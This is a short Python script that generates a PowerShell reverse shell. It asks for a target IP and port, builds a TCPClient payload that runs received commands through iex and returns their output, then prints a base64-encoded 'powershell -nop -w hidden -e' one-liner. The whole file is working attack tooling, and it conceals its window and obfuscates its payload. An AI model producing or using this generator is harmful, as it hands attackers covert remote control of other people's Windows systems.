import sys
import base64

target = input('Enter target IPv4 address:')
port = input('Enter reverse shell port:')

payload = (f'$client = New-Object System.Net.Sockets.TCPClient(\"{target}\", {port});$stream = $client.GetStream();[byte['
           ']]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object '
           '-TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String '
           ');$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes('
           '$sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()')
print('\n')
print('Confirm this is your payload:\n' + payload)
print('\n')
print('If that\'s good, you\'re payload is...')
cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)